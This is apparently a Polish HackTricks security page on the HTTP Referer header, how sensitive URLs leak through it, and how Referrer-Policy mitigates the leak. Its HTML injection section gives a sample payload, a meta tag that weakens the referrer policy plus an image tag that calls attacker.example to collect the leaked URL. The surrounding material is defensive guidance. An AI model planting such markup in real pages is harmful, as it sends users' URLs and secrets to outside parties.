# Interesujące zachowanie HTTP

{{#include ../banners/hacktricks-training.md}}

## Nagłówek `Referer` i Referrer Policy

Nagłówek żądania HTTP `Referer` identyfikuje absolutny lub częściowy URL, z którego zażądano zasobu. W zależności od aktywnej referrer policy może zawierać origin, ścieżkę i query string strony odsyłającej, ale nie fragment URL.<sup>[[1]](#references)</sup>

### Wyciek wrażliwych informacji

Sekrety w ścieżkach URL lub parametrach zapytań mogą leakować przez historię przeglądarki, logi, analitykę, skopiowane linki i nagłówek `Referer`. Link cross-origin lub żądanie subresource może zatem ujawnić URL strony odsyłającej zewnętrznemu serwerowi.<sup>[[2]](#references)</sup>

### Mitigacja

Użyj nagłówka odpowiedzi `Referrer-Policy`, aby kontrolować ilość informacji o stronie odsyłającej wysyłanych przez przeglądarkę. `strict-origin-when-cross-origin` jest obecnie domyślną opcją w przeglądarkach, natomiast `no-referrer` całkowicie wyłącza ten nagłówek; wybierz policy odpowiadającą wymaganiom aplikacji.<sup>[[3]](#references)</sup>
```http
Referrer-Policy: no-referrer
Referrer-Policy: no-referrer-when-downgrade
Referrer-Policy: origin
Referrer-Policy: origin-when-cross-origin
Referrer-Policy: same-origin
Referrer-Policy: strict-origin
Referrer-Policy: strict-origin-when-cross-origin
Referrer-Policy: unsafe-url
```
Nie umieszczaj haseł, identyfikatorów sesji, kluczy API ani innych poufnych wartości w URL-ach. Zamiast tego przesyłaj je w odpowiednich nagłówkach żądań lub treści żądań za pośrednictwem TLS.<sup>[[2]](#references)</sup>

### Uwagi dotyczące HTML Injection

Dokument może również ustawić politykę obowiązującą dla całej strony za pomocą `<meta name="referrer">`. Jeśli luka w HTML injection umożliwia atakującemu wstawienie skutecznego elementu meta, może on próbować osłabić politykę dokumentu dla kolejnych żądań. Dynamicznie wstrzykiwane lub sprzeczne polityki meta mogą zachowywać się w nieprzewidywalny sposób, dlatego należy zweryfikować to zachowanie w docelowej przeglądarce, zamiast zakładać, że nagłówek odpowiedzi jest zawsze nadpisywany.<sup>[[4]](#references)</sup>
```html
<meta name="referrer" content="unsafe-url">
<img src="https://attacker.example/collect" alt="">
```
Napraw bazowe HTML injection i nie umieszczaj poufnych danych w URL; referrer policy jest mechanizmem defense in depth, a nie substytutem żadnej z tych kontroli.

## References

- [1] [MDN - nagłówek `Referer`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Referer)
- [2] [MITRE CWE-598 - użycie metody żądania GET z poufnymi ciągami zapytań](https://cwe.mitre.org/data/definitions/598.html)
- [3] [MDN - nagłówek `Referrer-Policy`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Referrer-Policy)
- [4] [MDN - `<meta name="referrer">`](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/meta/name/referrer)
{{#include ../banners/hacktricks-training.md}}
